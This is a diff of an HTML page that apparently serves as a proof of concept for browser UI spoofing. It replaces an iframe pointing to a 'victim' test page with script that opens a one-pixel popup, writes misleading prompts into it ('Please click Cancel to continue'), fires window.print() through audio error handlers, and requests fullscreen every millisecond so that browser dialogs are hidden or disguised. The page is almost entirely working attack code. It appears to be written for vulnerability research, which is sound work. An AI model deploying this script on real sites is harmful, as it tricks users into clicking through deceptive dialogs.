@@ -1,1 +1,22 @@
-<iframe src="https://victimjodyritonga-create.github.io/victim/test.html"></iframe>
+<button onclick="launch()">New Window</button>
+<button onclick="spoof()">Spoof</button>
+
+<script>
+var childWindow;
+var fsLoop;
+
+function launch() {
+childWindow = window.open('', '', 'width=1,height=1');
+setTimeout(function() { childWindow.moveTo(200,0) }, 333)
+
+childWindow.document.write(`Click "Spoof" to continue`)
+}
+
+function spoof() {
+  childWindow.document.close();
+  childWindow.document.write(`<h2>Please click "Cancel" to continue.</h2><audio src=x onerror="setTimeout(function(){window.close() },3600)"></audio><audio src=x onerror="window.print();document.close();document.write('Please wait...')"></audio>`)
+  fsLoop = setInterval(function() { document.documentElement.requestFullscreen(); }, 1)
+}
+
+addEventListener('fullscreenchange', (event) => { clearInterval(fsLoop); childWindow.resizeTo(1536, 955); });
+</script>
